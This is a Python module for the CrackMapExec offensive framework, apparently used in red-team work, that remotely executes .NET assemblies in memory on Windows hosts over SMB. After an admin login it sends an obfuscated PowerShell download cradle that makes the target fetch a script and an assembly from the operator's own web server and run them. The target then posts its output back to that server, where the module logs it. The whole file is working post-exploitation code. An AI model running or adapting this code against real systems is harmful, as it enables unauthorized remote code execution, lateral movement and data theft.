import os
from io import StringIO
from datetime import datetime
from cme.helpers.powershell import *
from cme.helpers.logger import write_log

class CMEModule:
    '''
        Uses Invoke-EAPrimer to execute .Net assemblies
        Module by @m8r0wn
    '''

    name = 'execute_assembly'
    description = "Remotely Execute .Net assemblies in memory"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            PATH    URL or local path to .Net assembly
            EXEARGS Arguments to pass to executable (default: None)
        '''

        if 'PATH' in module_options:
            self.assembly_path = module_options['PATH']
        else:
            context.log.error('PATH option is required!')
            exit(1)

        self.exeargs = None
        if 'EXEARGS' in module_options:
            self.exeargs = module_options['EXEARGS']

        self.ps_script = obfs_ps_script('EAPrimer/Invoke-EAPrimer.ps1')
        return

    def on_admin_login(self, context, connection):
        if self.assembly_path.startswith(('http://', 'https://')):
            self.assembly_name = None
            url_path = self.assembly_path

        elif os.path.exists(self.assembly_path):
            self.assembly_name = os.path.basename(self.assembly_path)
            url_path = "{server}://{addr}:{port}/{file}".format(server=context.server,
                                                                port=context.server_port,
                                                                addr=context.localip,
                                                                file = self.assembly_name)
        else:
            context.log.error('Target assembly not found.')
            exit(1)

        command = 'Invoke-EAPrimer -Post {server}://{addr}:{port} -Path {path}'.format(server=context.server,
                                                     port=context.server_port,
                                                     addr=context.localip,
                                                     path = url_path)

        if self.exeargs:
            command += ' -Args "{}"'.format(self.exeargs)

        launcher = gen_ps_iex_cradle(context, 'Invoke-EAPrimer.ps1', command)

        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-EAPrimer.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            request.wfile.write(self.ps_script.encode())

        elif self.assembly_name == request.path[1:]:
            with open(self.assembly_path, 'rb') as assembly:
                request.send_response(200)
                request.end_headers()
                request.wfile.write(assembly.read())

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('content-length'))
        data = response.rfile.read(length).decode('UTF-8', 'ignore')

        response.stop_tracking_host()

        if len(data):
            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            print_post_data(data)

            log_name = 'execute_assembly-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved output to {}".format(log_name))
